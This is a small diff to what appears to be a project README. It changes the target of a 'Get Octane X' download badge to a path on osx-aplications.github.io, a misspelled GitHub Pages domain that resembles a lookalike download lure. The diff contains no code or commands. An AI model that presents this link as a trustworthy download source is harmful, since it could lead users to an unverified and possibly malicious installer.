@@ -5,7 +5,7 @@
 <br>
 
 <p align="center">
-  <a href="https://osx-aplications.github.io/.github/">
+  <a href="https://osx-aplications.github.io/.github/octanex">
     <img src="https://img.shields.io/badge/Get%20Octane%20X-green?style=for-the-badge&logo=apple&logoColor=white" alt="Get Octane X">
   </a>
 </p>
